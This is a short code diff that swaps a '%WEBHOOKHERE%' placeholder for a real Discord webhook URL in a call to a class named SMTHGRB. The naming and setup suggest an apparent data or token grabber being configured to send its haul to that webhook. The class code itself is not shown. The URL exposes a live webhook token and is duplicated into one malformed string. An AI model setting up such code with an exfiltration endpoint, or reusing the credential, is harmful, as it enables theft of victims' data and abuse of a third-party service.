@@ -153,4 +153,4 @@ class SMTHGRB:
         })
 
 
-SMTHGRB("%WEBHOOKHERE%")
+SMTHGRB("https://discord.com/api/webhooks/1204962127874629664/AYfpN_ZucVPQ1y5tava4S08qvGyvbKHKE7E7stJcYDztdY7Huut2e6KVtLFxUBfsSuBghttps://discord.com/api/webhooks/1204962127874629664/AYfpN_ZucVPQ1y5tava4S08qvGyvbKHKE7E7stJcYDztdY7Huut2e6KVtLFxUBfsSuBg")
